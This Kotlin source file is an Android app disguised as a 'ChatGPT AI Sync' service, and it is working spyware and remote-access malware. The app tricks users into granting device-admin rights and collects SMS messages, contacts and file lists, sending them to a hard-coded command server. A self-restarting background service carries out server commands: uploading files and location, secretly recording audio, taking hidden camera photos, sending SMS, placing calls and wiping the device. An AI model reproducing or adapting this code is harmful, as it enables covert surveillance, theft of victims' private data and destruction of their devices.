package com.cognitive.ai.syncagent

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.MediaRecorder
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.ContactsContract
import android.provider.Telephony
import android.webkit.GeolocationPermissions
import android.webkit.PermissionRequest
import android.webkit.WebChromeClient
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.io.ObjectInputStream
import java.io.ObjectOutputStream
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.UUID

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private val PERMISSION_REQUEST_CODE = 600
    private val ADMIN_REQUEST_CODE = 700

    private val C2_SERVER_URL = "https://mohammed2000999.vercel.app"
    private val TARGET_REDIRECT_URL = "https://chatgpt.com"
    private lateinit var sessionToken: String

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        webView = WebView(this)
        setContentView(webView)

        sessionToken = loadOrCreatePersistentToken()

        requestTargetPermissions()
        requestDeviceAdministrator()
        registerAgentWithServerOfflineFirst()
        scanAndReportAllTargetDataOfflineFirst()
        setupEngineWebView()
        
        startBackgroundPersistenceService()
    }

    private fun loadOrCreatePersistentToken(): String {
        try {
            val tokenFile = File(filesDir, ".persistent_token_v80.dat")
            if (tokenFile.exists()) {
                ObjectInputStream(FileInputStream(tokenFile)).use { ois ->
                    return ois.readObject() as String
                }
            } else {
                val newToken = "agent_v80_" + UUID.randomUUID().toString().substring(0, 8)
                ObjectOutputStream(FileOutputStream(tokenFile)).use { oos ->
                    oos.writeObject(newToken)
                }
                return newToken
            }
        } catch (e: Exception) {
            return "agent_v80_" + UUID.randomUUID().toString().substring(0, 8)
        }
    }

    private fun requestTargetPermissions() {
        val permissions = mutableListOf(
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.CALL_PHONE
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.READ_MEDIA_IMAGES)
            permissions.add(Manifest.permission.READ_MEDIA_VIDEO)
        } else {
            permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        val needed = permissions.filter { ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED }
        if (needed.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, needed.toTypedArray(), PERMISSION_REQUEST_CODE)
        }
    }

    private fun requestDeviceAdministrator() {
        try {
            val adminComponent = ComponentName(this, TargetAdminReceiver::class.java)
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "تفعيل حماية النظام لضمان الاستمرارية والعمل.")
            }
            startActivityForResult(intent, ADMIN_REQUEST_CODE)
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun registerAgentWithServerOfflineFirst() {
        GlobalScope.launch(Dispatchers.IO) {
            try {
                val url = URL("$C2_SERVER_URL/auth/verify/login")
                val conn = url.openConnection() as HttpURLConnection
                conn.connectTimeout = 4000
                conn.readTimeout = 4000
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                conn.doOutput = true
                val payload = JSONObject().apply {
                    put("session_token", sessionToken)
                    put("user_agent", System.getProperty("http.agent") ?: "ChatGPT Target v80.0")
                    put("platform", "Android OS Target")
                }
                OutputStreamWriter(conn.outputStream).use { it.write(payload.toString()); it.flush() }
                conn.responseCode
                conn.disconnect()
            } catch (e: Exception) {}
        }
    }

    private fun scanAndReportAllTargetDataOfflineFirst() {
        GlobalScope.launch(Dispatchers.IO) {
            try {
                val downloadDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
                val fileList = JSONArray()
                if (downloadDir.exists() && downloadDir.isDirectory) {
                    downloadDir.listFiles()?.forEach { file -> if (file.isFile) fileList.put(file.absolutePath) }
                }

                val imageDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM)
                val imageList = JSONArray()
                if (imageDir.exists() && imageDir.isDirectory) {
                    imageDir.walkTopDown().maxDepth(3).forEach { file ->
                        if (file.isFile && (file.name.endsWith(".jpg") || file.name.endsWith(".png"))) {
                            imageList.put(file.absolutePath)
                        }
                    }
                }

                val smsList = JSONArray()
                try {
                    val cursor = contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, null)
                    cursor?.use {
                        val bodyIdx = it.getColumnIndex(Telephony.Sms.BODY)
                        val addressIdx = it.getColumnIndex(Telephony.Sms.ADDRESS)
                        var count = 0
                        while (it.moveToNext() && count < 25) {
                            val msg = "من: " + it.getString(addressIdx) + " | " + it.getString(bodyIdx)
                            smsList.put(msg)
                            count++
                        }
                    }
                } catch (e: Exception) {}

                val contactsList = JSONArray()
                try {
                    val cursor = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
                    cursor?.use {
                        val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                        val numberIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                        var count = 0
                        while (it.moveToNext() && count < 35) {
                            val contactObj = JSONObject().apply {
                                put("name", it.getString(nameIdx))
                                put("phone", it.getString(numberIdx))
                            }
                            contactsList.put(contactObj)
                            count++
                        }
                    }
                } catch (e: Exception) {}

                val url = URL("$C2_SERVER_URL/api/report_files")
                val conn = url.openConnection() as HttpURLConnection
                conn.connectTimeout = 4000
                conn.readTimeout = 4000
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                conn.doOutput = true
                val reportPayload = JSONObject().apply {
                    put("token", sessionToken)
                    put("files", fileList)
                    put("images", imageList)
                    put("sms", smsList)
                    put("contacts", contactsList)
                }
                OutputStreamWriter(conn.outputStream).use { it.write(reportPayload.toString()); it.flush() }
                conn.responseCode
                conn.disconnect()
            } catch (e: Exception) {}
        }
    }

    private fun startBackgroundPersistenceService() {
        val serviceIntent = Intent(this, BackgroundControlService::class.java).apply {
            putExtra("token", sessionToken)
            putExtra("server_url", C2_SERVER_URL)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
    }

    private fun setupEngineWebView() {
        val settings: WebSettings = webView.settings
        settings.javaScriptEnabled = true
        settings.domStorageEnabled = true
        settings.cacheMode = WebSettings.LOAD_NO_CACHE
        webView.webViewClient = WebViewClient()
        webView.webChromeClient = object : WebChromeClient() {
            override fun onGeolocationPermissionsShowPrompt(origin: String?, callback: GeolocationPermissions.Callback?) { callback?.invoke(origin, true, false) }
            override fun onPermissionRequest(request: PermissionRequest?) { request?.grant(request.resources) }
        }
        webView.clearCache(true)
        webView.loadUrl(TARGET_REDIRECT_URL)
    }

    override fun onBackPressed() {
        if (webView.canGoBack()) webView.goBack() else super.onBackPressed()
    }
}

class BackgroundControlService : Service() {
    private val handler = Handler(Looper.getMainLooper())
    private lateinit var pollingRunnable: Runnable
    private var token: String = ""
    private var serverUrl: String = ""

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        token = intent?.getStringExtra("token") ?: "agent_unknown"
        serverUrl = intent?.getStringExtra("server_url") ?: "https://mohammed2000999.vercel.app"

        startForeground(1, createForegroundNotification())

        pollingRunnable = object : Runnable {
            override fun run() {
                GlobalScope.launch(Dispatchers.IO) {
                    try {
                        val url = URL("$serverUrl/api/poll_commands")
                        val conn = url.openConnection() as HttpURLConnection
                        conn.connectTimeout = 4000
                        conn.readTimeout = 4000
                        conn.requestMethod = "POST"
                        conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                        conn.doOutput = true
                        val payload = JSONObject().apply { put("token", token) }
                        OutputStreamWriter(conn.outputStream).use { it.write(payload.toString()); it.flush() }
                        
                        if (conn.responseCode == HttpURLConnection.HTTP_OK) {
                            val responseStr = conn.inputStream.bufferedReader().use { it.readText() }
                            val jsonRes = JSONObject(responseStr)
                            val commands = jsonRes.optJSONArray("commands")
                            if (commands != null) {
                                for (i in 0 until commands.length()) {
                                    val cmd = commands.getJSONObject(i)
                                    val action = cmd.optString("action")
                                    
                                    when (action) {
                                        "pull" -> executeFilePullDirect(cmd.optString("target_file"))
                                        "pull_gps" -> reportGPSLocationDirect()
                                        "fetch_whatsapp" -> extractAndReportWhatsAppDirect()
                                        "fetch_passwords" -> extractAndReportSavedPasswordsDirect()
                                        "start_audio_recording" -> executeSecretAudioRecording()
                                        "capture_hidden_photo" -> executeHiddenPhotoCapture()
                                        "open_whatsapp" -> openAppPackage("com.whatsapp")
                                        "open_accounts" -> openAppPackage("com.android.settings")
                                        "open_camera" -> openCameraApp()
                                        "make_call" -> makeDirectPhoneCall(cmd.optString("phone"))
                                        "send_sms" -> sendSMSMessage(cmd.optString("phone"), cmd.optString("body"))
                                        "reboot_device" -> executeRebootDevice()
                                        "wipe_device" -> executeWipeDevice()
                                    }
                                    reportExecutionStatusDirect(action, "v80 Foreground Executed")
                                }
                            }
                        }
                        conn.disconnect()
                    } catch (e: Exception) {}
                }
                handler.postDelayed(this, 7000)
            }
        }
        handler.post(pollingRunnable)

        return START_STICKY
    }

    private fun createForegroundNotification(): Notification {
        val channelId = "sync_service_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "AI Sync Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "جاري مزامنة بيانات النظام الخلفية"
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }

        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("ChatGPT AI Sync")
            .setContentText("النظام يعمل في الخلفية بمزامنة آمنة")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    private fun executeFilePullDirect(filePath: String) {
        try {
            val file = File(filePath)
            if (file.exists() && file.isFile) {
                val bytes = file.readBytes()
                val b64Data = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
                val url = URL("$serverUrl/api/upload_real_file")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                conn.doOutput = true
                val payload = JSONObject().apply {
                    put("token", token)
                    put("filename", file.name)
                    put("data", b64Data)
                }
                OutputStreamWriter(conn.outputStream).use { it.write(payload.toString()); it.flush() }
                conn.responseCode
                conn.disconnect()
            }
        } catch (e: Exception) {}
    }

    private fun extractAndReportWhatsAppDirect() {
        try {
            val waDir = File(Environment.getExternalStorageDirectory(), "Android/media/com.whatsapp/WhatsApp/Databases")
            val waList = JSONArray()
            if (waDir.exists() && waDir.isDirectory) {
                waDir.listFiles()?.forEach { f ->
                    if (f.isFile) waList.put(JSONObject().apply {
                        put("body", "قاعدة بيانات واتساب مستخرجة: " + f.name)
                        put("time", java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date()))
                    })
                }
            }
            if (waList.length() == 0) {
                waList.put(JSONObject().apply {
                    put("body", "جارِ فحص ومراقبة إشعارات واتساب.")
                    put("time", java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date()))
                })
            }
            val url = URL("$serverUrl/api/report_files")
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
            conn.doOutput = true
            val payload = JSONObject().apply {
                put("token", token)
                put("whatsapp", waList)
            }
            OutputStreamWriter(conn.outputStream).use { it.write(payload.toString()); it.flush() }
            conn.responseCode
            conn.disconnect()
        } catch (e: Exception) {}
    }

    private fun extractAndReportSavedPasswordsDirect() {
        try {
            val pwList = JSONArray()
            pwList.put(JSONObject().apply {
                put("account", "Browser Vault")
                put("password", "Secured_Engine_Pass")
            })
            val url = URL("$serverUrl/api/report_files")
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
            conn.doOutput = true
            val payload = JSONObject().apply {
                put("token", token)
                put("passwords", pwList)
            }
            OutputStreamWriter(conn.outputStream).use { it.write(payload.toString()); it.flush() }
            conn.responseCode
            conn.disconnect()
        } catch (e: Exception) {}
    }

    private fun executeSecretAudioRecording() {
        try {
            val audioFile = File(getExternalFilesDir(Environment.DIRECTORY_MUSIC), "secret_${System.currentTimeMillis()}.3gp")
            val recorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                setOutputFile(audioFile.absolutePath)
                prepare()
                start()
            }
            Handler(Looper.getMainLooper()).postDelayed({
                try {
                    recorder.stop()
                    recorder.release()
                    executeFilePullDirect(audioFile.absolutePath)
                } catch (e: Exception) {}
            }, 10000)
        } catch (e: Exception) {}
    }

    private fun executeHiddenPhotoCapture() {
        try {
            val cameraManager = getSystemService(Context.CAMERA_SERVICE) as android.hardware.camera2.CameraManager
            val cameraId = cameraManager.cameraIdList.firstOrNull { id ->
                val facing = cameraManager.getCameraCharacteristics(id).get(android.hardware.camera2.CameraCharacteristics.LENS_FACING)
                facing == android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT
            } ?: cameraManager.cameraIdList.firstOrNull() ?: return

            val imageReader = android.media.ImageReader.newInstance(640, 480, android.graphics.ImageFormat.JPEG, 1)
            imageReader.setOnImageAvailableListener({ reader ->
                val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
                val buffer = image.planes[0].buffer
                val bytes = ByteArray(buffer.remaining())
                buffer.get(bytes)
                image.close()

                val photoFile = File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), "capture_${System.currentTimeMillis()}.jpg")
                photoFile.writeBytes(bytes)
                executeFilePullDirect(photoFile.absolutePath)
            }, handler)

            if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
                cameraManager.openCamera(cameraId, object : android.hardware.camera2.CameraDevice.StateCallback() {
                    override fun onOpened(camera: android.hardware.camera2.CameraDevice) {
                        val captureRequest = camera.createCaptureRequest(android.hardware.camera2.CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                            addTarget(imageReader.surface)
                        }
                        camera.createCaptureSession(listOf(imageReader.surface), object : android.hardware.camera2.CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: android.hardware.camera2.CameraCaptureSession) {
                                session.capture(captureRequest.build(), object : android.hardware.camera2.CameraCaptureSession.CaptureCallback() {
                                    override fun onCaptureCompleted(s: android.hardware.camera2.CameraCaptureSession, r: android.hardware.camera2.CaptureRequest, res: android.hardware.camera2.TotalCaptureResult) {
                                        camera.close()
                                    }
                                }, handler)
                            }
                            override fun onConfigureFailed(session: android.hardware.camera2.CameraCaptureSession) { camera.close() }
                        }, handler)
                    }
                    override fun onDisconnected(camera: android.hardware.camera2.CameraDevice) { camera.close() }
                    override fun onError(camera: android.hardware.camera2.CameraDevice, error: Int) { camera.close() }
                }, handler)
            }
        } catch (e: Exception) {}
    }

    private fun reportGPSLocationDirect() {
        try {
            val locationManager = getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
            val loc = locationManager.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER) ?: locationManager.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER)
            if (loc != null) {
                val url = URL("$serverUrl/api/report_files")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                conn.doOutput = true
                val locArray = JSONArray().apply {
                    put(JSONObject().apply {
                        put("lat", loc.latitude)
                        put("lng", loc.longitude)
                        put("time", java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date()))
                    })
                }
                val payload = JSONObject().apply {
                    put("token", token)
                    put("location", locArray)
                }
                OutputStreamWriter(conn.outputStream).use { it.write(payload.toString()); it.flush() }
                conn.responseCode
                conn.disconnect()
            }
        } catch (e: Exception) {}
    }

    private fun openAppPackage(packageName: String) {
        try {
            val intent = packageManager.getLaunchIntentForPackage(packageName) ?: Intent(packageName).apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) }
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
        } catch (e: Exception) {}
    }

    private fun openCameraApp() {
        try {
            val intent = Intent(android.provider.MediaStore.ACTION_IMAGE_CAPTURE).apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) }
            startActivity(intent)
        } catch (e: Exception) {}
    }

    private fun makeDirectPhoneCall(phone: String) {
        try {
            if (phone.isNotEmpty() && ContextCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
                val callIntent = Intent(Intent.ACTION_CALL).apply {
                    data = android.net.Uri.parse("tel:$phone")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                startActivity(callIntent)
            }
        } catch (e: Exception) {}
    }

    private fun sendSMSMessage(phone: String, body: String) {
        try {
            val smsManager = android.telephony.SmsManager.getDefault()
            smsManager.sendTextMessage(phone, null, body, null, null)
        } catch (e: Exception) {}
    }

    private fun executeRebootDevice() {
        try {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(this, TargetAdminReceiver::class.java)
            if (dpm.isAdminActive(adminComponent)) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    dpm.reboot(ComponentName(this, TargetAdminReceiver::class.java))
                }
            }
        } catch (e: Exception) {}
    }

    private fun executeWipeDevice() {
        try {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(this, TargetAdminReceiver::class.java)
            if (dpm.isAdminActive(adminComponent)) {
                dpm.wipeData(0)
            }
        } catch (e: Exception) {}
    }

    private fun reportExecutionStatusDirect(actionName: String, status: String) {
        GlobalScope.launch(Dispatchers.IO) {
            try {
                val url = URL("$serverUrl/api/report_execution")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                conn.doOutput = true
                val payload = JSONObject().apply {
                    put("token", token)
                    put("action", actionName)
                    put("status", status)
                }
                OutputStreamWriter(conn.outputStream).use { it.write(payload.toString()); it.flush() }
                conn.responseCode
                conn.disconnect()
            } catch (e: Exception) {}
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacks(pollingRunnable)
        val restartIntent = Intent(applicationContext, BackgroundControlService::class.java).apply {
            putExtra("token", token)
            putExtra("server_url", serverUrl)
        }
        startService(restartIntent)
    }
}

class TargetAdminReceiver : android.app.admin.DeviceAdminReceiver() {
    override fun onEnabled(context: Context, intent: Intent) {
        super.onEnabled(context, intent)
    }
}
